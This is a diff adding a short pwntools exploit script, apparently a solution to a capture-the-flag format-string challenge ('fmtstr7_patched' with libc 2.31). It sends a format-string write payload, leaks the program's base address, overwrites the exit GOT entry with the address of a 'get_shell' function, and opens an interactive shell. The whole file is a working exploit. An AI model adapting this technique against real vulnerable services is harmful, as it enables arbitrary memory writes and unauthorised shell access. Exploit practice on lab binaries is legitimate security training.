@@ -1,0 +1,31 @@
+from pwn import *
+
+p = process("./fmtstr7_patched")
+'''
+p = gdb.debug("./fmtstr7_patched", gdbscript = 
+break *main + 343
+r
+)
+'''
+
+
+e = ELF("./fmtstr7_patched")
+libc = ELF("./libc-2.31.so")
+
+payload = b"%*14$c%15$hn"
+p.sendafter(b"Receiver: ", payload)
+
+payload = b"A" * 32
+p.sendafter(b"Title: ", payload)
+
+p.recvuntil(payload)
+code_base = u64(p.recv(6) + b"\x00" * 2) - 64
+exit_got = code_base + e.got['exit']
+win = code_base + e.symbols['get_shell']
+
+payload = p64(win & 0xffff) + p64(exit_got)
+p.sendafter(b"Content: ", payload)
+
+p.recvuntil(b"sent to ")
+
+p.interactive()
